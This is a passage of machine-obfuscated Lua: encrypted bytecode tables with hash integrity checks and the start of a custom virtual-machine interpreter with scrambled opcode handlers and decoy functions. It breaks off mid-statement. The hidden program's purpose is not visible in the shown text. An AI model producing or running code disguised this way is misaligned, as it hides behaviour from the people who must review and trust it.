tm6[84]={u7T=FB(TYB("tYZ1?;Kp<GqZH|VZT!6GHFwR51sr6(S%`KActxwLLaPXqE#5{6=ZeGn4AJ)o@PL;Y+GK1v=MqRkpHK42#CwR1t-L3d5=9jq?L-XMD+R?gQ~-Hek+cm+JTeJ$#iuQZ7##Z2EB(`5T0X10OJP!W*13q#^dEYZ~Z0=t8oqdF!-4>r<*1m~Jhn0lAIpXWDJqNk(5aD;r<{@o1WtzbqZZG1*H=&f?)3F3i~N2fx|Ly{c|Z2G{$zIgOtgQ5T0t!dCPz}L8Ih9EK5yHi^x>DS?Eg|(<#rt?_G0+x-VI&Is6Wq*eE<dAowOV2SUr`Hz)Q`M+jP}gupIC{C0xRlnI2*buOj4>9zV8CR&cGRwYP*B9#V?OzG$Ky)=g*a9kzI|jKe1trHdn5X`lp_-keWs{FDnLroendp#cZluCEbSTaNh}(;Yk{&5~pR^;v{xdO9MrkFtI$`LYbvlLV`wZ`9z)U+%6lVxs}3v8SkZ>GOd^hD=W50!B#KA_3<G~FLo}r=40ZmXLQdmib8{XYJ=s8a2L?GSpOvf=!mu1{DQn`Te5n|CX?5B5vQ^(ej}oO#gA","t=Y+!WEr0uSGg`Ly)?l{aoO3H2jb1cPmBU}fh($6pK;4s^dDI#Ne9CRJ5*Qn8xZ|7Tivk&V<@>_~q-XzAwFM%",508,3,0,2)),bK=0,a=false,Iwa=15,qsK=4,A7v={85,86},UPK=103091827} tm6[85]={u7T=FB(TYB("UqZglA>vwGIG9exNw=NS9JXJg)$1^e?h8&fXx!Kxfm~WH","U-~qx`R4Wgzw=E{t#Mp@9;_?!f&PI0h5oQ+YvGCVkeAOB<HD>ji2%)3JlSsr}dN^1nuyFX$8L*7mbacT|ZK6(",24,3,0,2)),bK=0,a=false,Iwa=1,qsK=2,A7v={},UPK=680799208} tm6[86]={u7T=FB(TYB("Wor&T5}!0GqLH0*38v?d%4*H)5NIQ*Gy@!7aZ&22sGC_>GKM-6L?7iDLB1dn3>QWs1M+jUFk)JD;s**!b$m8@W49%^bbsyZ(jOh>{J&wa;o%;","WI#oC1zB)XbcV5~JAt}|qdGl^mvO4s_0$uY<Z2w>kyL7g;h9xNSR=e(nK{3%ai&T+*QrPE6-pU@fMD?j`F8!H",76,3,0,2)),bK=0,a=false,Iwa=1,qsK=3,A7v={},UPK=599192467}; for K=1,#tm6 do local Ons=tm6[K] local P=0 for Se=1,#Ons.u7T do P=(P*31+Ons.u7T[Se])%1000000007 end if P~=Ons.UPK then Ons.u7T={} end end; local w w=function(Ons,fjv,...) local n={...} local Ym=select("#",...) local bwo={} for K=1,Ons.bK do bwo[K-1]=n[K] end local Y7R=Ons.u7T local FX=Ons.A7v local _e=1 local CXt=Ons.bK local O local s9o={} local function d() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b10000_01100110111+0b101001011101100110)%256))%0X100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0b10100110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X29766)%0b100000000))%0b10000000_0)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+680311)%0X10_0))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%0b100000000))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b100_0001100110111+169830)%0b100000000))%0B100000000)%0X10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0Xa6177)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0x10_0))%0X100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X29766)%0x100))%0X100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0Xa6177)%0x100))*256;_e=_e+2;bwo[w6]=bwo[m]-bwo[JNt] end local function RWD() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8_337+0B101001011101100110)%0B1000000_00))%256)%0b100_000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0Xa6177)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X29766)%0b10_0000000))%0X100)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B10100110000101110111)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0B101001011101_100110)%0X1_00))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0Xa6177)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001_100110111+169830)%0x1_00))%0b100000000)%0B10_0000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0xa6177)%0B100000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+169830)%256))%0x100)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0x29766)%0x100))%0B100000_000)%0X1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%0X1_00))*256;_e=_e+2;bwo[w6]=RX(bwo[m],bwo[JNt]) end local function zD() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0B101001011101100110)%256))%0x1_00)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1_101110110101000000+0xa6177)%0x1_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0x29766)%0B100000000))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0B1010011000010111011_1)%0b100000000))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0b101001011101100110)%0X100))%0B1000_00000)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8_337+0X29766)%0x100))%0B10000000_0)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b110_1110110101000000+0b10100110000101110111)%0X100))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100_110111+0x29766)%0B100000000))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0b1010011000010_1110111)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0x29766)%0B100000000))%0x100)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0b10100110000101110111)%0X100))*256;_e=_e+2;bwo[w6]=DV(bwo[m]%4294967296,bwo[JNt]%4294967296) end local function mQ7() bwo[CXt+1]=bwo[CXt] end local function w0z() bwo[CXt+1]=bwo[CXt] end local function b() bwo[2]=nil end local function z() bwo[18]=(bwo[49] or 0)+6 end local function OJ() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%256))%0B1000_00000)%0B10000_0000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0B10100110000101110111)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B101001011101100110)%0B100000000))%0B100000000)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed4_0+0xa6177)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0X29766)%0B100000000))%0X1_00)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B10100110000101110111)%0b10000_0000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+0B101_001011101100110)%0B10_0000000))%0B100000000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x83_37+0B101001011101100110)%0X100))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0x29766)%0X100))%0b100000000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed_40+0b10100110000101110111)%0X100))*256;_e=_e+2;bwo[w6]=o(bwo[m],bwo[JNt]) end local function K80() bwo[16]=(bwo[10] or 0)+4 end local function ox() bwo[25]=nil end local function Q6() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%256))%0b100000000)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%0b1_00000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0x29766)%0b100000000))%0B100000000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6177)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0x2_9766)%0X100))%0B1_00000000)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0X29_766)%256))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B10100110000101110111)%0B100000000))*256;_e=_e+2;local _R=bwo[w6];local _HG0=(_R~=nil and _R~=false);if _HG0~=(m~=0) then _e=_e+1+2 end end local function HN() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0x29766)%256))%0B1000_00000)%0b1000_00000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0X10_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x833_7+0X29_766)%256))%0X1_00)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B10100110000101110111)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%0x100))%0x10_0)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b11011101101010000_00+0xa61_77)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B1010010111_01100110)%0b100000000))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa617_7)%0b100000000))*256;_e=_e+2;bwo[w6]=ZM(bwo[m]) end local function D5i() bwo[40]=bwo[36] or 0 end local function I() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%256))%0b1000_00000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0Xa61_77)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%256))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6e_d40+680311)%0x10_0))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x83_37+0X297_66)%256))%0x100)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0Xa_6177)%0b100_000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0x2976_6)%0X10_0))%0b100000000)%0X1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0xa617_7)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B10000011_00110111+0b101001011101100110)%256))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0x29766)%256))%0B100000000)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B11011101_10101000000+680311)%0B100_000000))*256;_e=_e+2;bwo[w6]=bwo[m][JkZ(JNt+1)] end local function PJ() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0X29766)%256))%0X10_0)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0xa6177)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%0x10_0))%256)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b10100110000101110111)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0X29_766)%0X100))%0b100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0B10000000_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X297_66)%0B100000000))%0X10_0)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0Xa6177)%0B100000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0x100))%0b100000000)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0b10100110000101110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X833_7+0b101001011101_100110)%0x100))%0X10_0)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0Xa6177)%0x100))*256;_e=_e+2;bwo[w6]=oN(bwo[m]%4294967296,bwo[JNt]%4294967296) end local function ekH() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0B100000000))%0b100000000)%0B100000_000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X29766)%256))%0b100000000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%256))*256-32768;_e=_e+2;_e=_e+w6 end local function Ms9() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100110)%0b100000000))%0b100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0B10100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0B1010010_11101100110)%0b10000_0000))%256)%0b1000_00000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0b10100_110000101110111)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0B101001011101100110)%0x100))%0B100000000)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6e_d40+0B10100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0X29766)%0x100))%256)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0B1010011000010111_0111)%0B100000000))*256;_e=_e+2;if m==0 then local __j=Ym-Ons.bK;if __j<0 then __j=0 end;for _mv=1,__j do bwo[w6+_mv-1]=n[Ons.bK+_mv] end;CXt=w6+__j else local _zK=m-1;for _mv=1,_zK do bwo[w6+_mv-1]=n[Ons.bK+_mv] end end end local function gR() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0X29766)%0X100))%0B100000000)%0X10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0b10100110000101110111)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B101001011101100110)%0X10_0))%0b100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed4_0+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0X29_766)%0x100))%0X100)%0B10000_0000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B10100110000101110_111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b10_00001100110111+169830)%0x100))%0x10_0)%0X10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0B101001100_00101110111)%0b100000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+169830)%0x10_0))%0B100000000)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X29766)%0X10_0))%256)%0B1000_00000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed_40+0Xa6177)%256))*256;_e=_e+2;bwo[w6]=math.floor(bwo[m]/bwo[JNt]) end local function dC() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000_001100110111+169830)%0B100000000))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%256))%0B100000000)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6_177)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0X297_66)%0X10_0))%0x10_0)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b101001011101100110)%0b100000000))%0B100000000)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0Xa6_177)%0X10_0))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%256))%256)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0Xa6177)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X833_7+0x29766)%256))%256)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0xa6177)%256))*256;_e=_e+2;bwo[w6]=bwo[m]/bwo[JNt] end local function OW() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%0B100000000))%0B100000000)%0X10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0xa617_7)%0B1000000_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0b101001011101100110)%256))%0X1_00)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0X29766)%0B10000000_0))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0B100000000))%0B100000_000)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0B10100110000101110_111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x833_7+0x29766)%0X100))%256)%0b10_0000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0xa6_177)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X29766)%0B100000000))%0x100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%256))*256;_e=_e+2;if (bwo[m]<=bwo[JNt])~=(w6~=0) then _e=_e+1+2 end end local function Ha() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0x100))%0B100000000)%0x10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b10000011_00110111+0b10_1001011101100110)%0x100))%256)%0X1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0xa617_7)%0B100000000))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b100000110_0110111+0x29766)%256))%0b100000000)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0b1010010_11101100110)%0x1_00))%0x10_0)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6_177)%0X100))*256;_e=_e+2;bwo[w6]=JkZ(m+1) end local function uao() bwo[48]=(bwo[20] or 0)+6 end local function sG() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0X29766)%0B100000000))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa617_7)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+169830)%256))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%0x1_00))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0X29766)%0b100000000))%0B100000000)%0X10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0b101001011101100110)%0b100000000))%0x100)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0X29766)%256))%0x10_0)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0b10100110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0x29766)%0B100000000))%0B100000000)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed_40+0xa617_7)%0x10_0))*256;_e=_e+2;bwo[w6]=bwo[m]*bwo[JNt] end local function yw9() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0b100000000))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0b10100110000101110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%0b100000000))%256)%0b10000000_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0xa6177)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100110)%0X100))%0X100)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+680311)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%0x100))%0X100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+0b10100110000101110111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0X1_00))%0B100000000)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6_ed40+680311)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%0X100))%0b100000000)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed4_0+0Xa6177)%0x10_0))*256;_e=_e+2;bwo[w6]=bwo[m]/bwo[JNt] end local function PsX() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0x29_766)%0B100000000))%0X100)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B11011101101010_00000+0b10100110000101110111)%0b10_0000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0B101001011101100110)%256))%0x100)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0B10100110000101110111)%0b10000000_0))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b10000_01100110111+0B101001011101100110)%0b1_00000000))%0x100)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B101001100001011_10111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%256))%0b100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b10100110000101110111)%0x100))*256;_e=_e+2;bwo[w6]=bwo[m] end local function DZi() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%0B100000000))%0b100000000)%0B10000_0000),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6e_d40+0b10100110000101110111)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X2976_6)%0b100000000))%0b100000000)%0B1_00000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B11011101101010_00000+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%0X100))%0X100)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0b110111011_0101000000+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+169830)%0b100000000))%0b1000000_00)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+680311)%0X100))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0B101001011101100110)%0X100))%0X100)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0xa6177)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0X29766)%0b100000000))%0x100)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0Xa_6177)%0b100000000))*256;_e=_e+2;bwo[w6]=bwo[m]+bwo[JNt] end local function L() bwo[28]=nil end local function T9() local _junk=(_e%7)+2 end local function TpX() bwo[36]=(bwo[55] or 0)+5 end local function e7() bwo[47]=nil end local function gm5() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0b10000000_0))%0x10_0)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0Xa6177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X83_37+169830)%256))%0X100)%0B10000_0000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+680311)%256))*256;_e=_e+2;local 